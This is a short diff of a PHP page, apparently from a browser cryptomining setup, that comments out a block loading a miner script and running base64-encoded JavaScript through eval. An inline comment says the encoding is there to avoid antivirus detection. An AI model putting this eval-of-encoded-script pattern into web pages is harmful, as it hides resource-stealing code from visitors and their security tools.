@@ -102,16 +102,19 @@ try {
 ');
 */
 
-?>
-<html>
-<head>
-	<meta http-equiv="refresh" content="3600">
-</head>
-<body>
+/*
 <script type="text/javascript" src="<?php echo $miner; ?>"></script>
 <script type="text/javascript">
 // base64 needed here since some antiviruses will flag this even if the user's add the url in the whitelist
 eval(atob('<?php echo $js; ?>'));
 </script>
+*/
+
+?>
+<html>
+<head>
+	<meta http-equiv="refresh" content="14400">
+</head>
+<body>
 </body>
 </html>
